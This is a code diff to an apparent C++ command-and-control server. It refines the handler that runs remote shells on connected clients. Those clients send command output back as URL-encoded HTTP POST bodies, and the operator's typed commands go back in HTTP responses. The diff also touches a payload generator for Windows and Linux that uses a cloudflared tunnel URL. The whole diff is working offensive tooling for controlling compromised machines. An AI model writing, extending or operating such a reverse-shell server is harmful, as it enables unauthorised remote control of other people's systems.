@@ -86,7 +86,7 @@ void shell(unordered_map<string, int>& mp, int server_fd) {
         else if (se.find("generate")!=se.end()){
             if(se.find("os=windows")!=se.end()){
                 string payload=payload_generator_windows(cloudflared_url);
-                cout<<payload<<endl;
+                cout<<"\n"<<payload<<"\n"<<endl;
             }
             else if(se.find("os=linux")!=se.end()){
                 string payload="";
@@ -174,44 +174,85 @@ string url_decode(const string& request) {
     }
     return "";
 }
-
 void serve_client(string endpoint, int server_fd) {
     bool flag = true;
+    bool terminate_client = false;
+    string local_user_input;
+    mutex input_mutex;
+    bool input_ready = false;
+    atomic<bool> need_prompt = true; // Flag to control prompt printing
 
     cout << "\n[+] Entering remote shell with client '" << endpoint << "'\n";
     cout << "    Type 'quit' to return to MainShell.\n\n";
 
     auto input_func = [&]() {
-        cout << "(Shell@" << endpoint << ") > ";
+        cout << "(Shell@" << endpoint << ") > " << flush;
         while (flag) {
-            getline(cin >> ws, user_input);
+            // Show prompt if needed
+            if (need_prompt) {
 
-            if (user_input == "quit") {
+                need_prompt = false;
+            }
+
+            string temp_input;
+            getline(cin >> ws, temp_input);
+
+            if (temp_input == "exit") {
+                cout << "Are you sure you want to terminate the connection?\n";
+                char choice;
+                while (true) {
+                    cout << "(Y/N): ";
+                    cin >> choice;
+                    cin.ignore();
+                    choice = toupper(choice);
+
+                    if (choice == 'Y') {
+                        lock_guard<mutex> lock(input_mutex);
+                        local_user_input = "exit";
+                        input_ready = true;
+                        terminate_client = true;
+                        flag = false;
+                        break;
+                    } else if (choice == 'N') {
+                        cout <<"(Shell@" << endpoint << ") > " << flush;
+                        break;
+                    } else {
+                        cout << "Invalid choice, please enter Y or N\n";
+                    }
+                }
+            } else if (temp_input == "quit") {
+                lock_guard<mutex> lock(input_mutex);
+                local_user_input = ""; // No command to send
+                input_ready = true;
                 flag = false;
+            } else {
+                lock_guard<mutex> lock(input_mutex);
+                local_user_input = temp_input;
+                input_ready = true;
             }
         }
     };
 
     auto fut = async(launch::async, input_func);
 
-    while (true) {
+    while (flag || input_ready) {
         string full_request;
 
-        // Step 1: Read until \r\n\r\n --> get full headers first
+        // Step 1: Read until \r\n\r\n
         while (full_request.find("\r\n\r\n") == string::npos) {
             char buffer[BUFFER_SIZE] = {0};
             ssize_t valread = read(mp[endpoint], buffer, BUFFER_SIZE - 1);
-          
 
             if (valread <= 0) {
+                flag = false;
                 break;
             }
 
             full_request += string(buffer, valread);
         }
 
-        if (full_request.empty()) {
-            continue;
+        if (!flag && !input_ready) {
+            break;
         }
 
         // Step 2: Parse Content-Length
@@ -232,33 +273,49 @@ void serve_client(string endpoint, int server_fd) {
         }
 
         // Step 3: Read body fully
-        string body_data = full_request.substr(body_start_pos + 4);  // Skip \r\n\r\n
+        string body_data = full_request.substr(body_start_pos + 4);
 
         while ((int)body_data.length() < content_length) {
             char buffer[BUFFER_SIZE] = {0};
             ssize_t valread = read(mp[endpoint], buffer, BUFFER_SIZE - 1);
 
             if (valread <= 0) {
+                flag = false;
                 break;
             }
 
             body_data += string(buffer, valread);
         }
 
+        if (!flag && !input_ready) {
+            break;
+        }
+
         // Step 4: Decode and display result if POST
-        if (full_request.find("POST") != string::npos and full_request.find("ERROR:")==string::npos) {
+        if (full_request.find("POST") != string::npos && full_request.find("ERROR:") == string::npos) {
             string result = url_decode(body_data);
 
             if (result.size() > 3) {
                 result.resize(result.size() - 3);
-                cout << result << "\n(Shell@" << endpoint << ") > " << flush;
+                cout << result <<"(Shell@" << endpoint << ") > " << flush;
             } else {
-                cout << result << "\n(Shell@" << endpoint << ") > " << flush;
+                cout << result<<"(Shell@" << endpoint << ") > " << flush;
+            }
+
+            // After printing result, force input thread to show prompt again
+            need_prompt = true;
+        }
+
+        // Step 5: Send response (command), if any
+        string body;
+        {
+            lock_guard<mutex> lock(input_mutex);
+            if (input_ready) {
+                body = local_user_input;
+                input_ready = false;
             }
         }
 
-        // Step 5: Send response (command)
-        string body = user_input;
         string response = "HTTP/1.1 200 OK\r\n"
                           "Content-Type: text/plain\r\n"
                           "Content-Length: " + to_string(body.length()) + "\r\n"
@@ -266,9 +323,16 @@ void serve_client(string endpoint, int server_fd) {
                           "\r\n" + body;
 
         send(mp[endpoint], response.c_str(), response.length(), 0);
-        user_input = "";
 
-        if (flag == false) {
+        // If terminating client after sending "exit"
+        if (terminate_client && body == "exit") {
+            close(mp[endpoint]);
+            mp.erase(endpoint);
+            break;
+        }
+
+        // If user selected "quit", just exit serve_client
+        if (!flag && !terminate_client) {
             break;
         }
     }
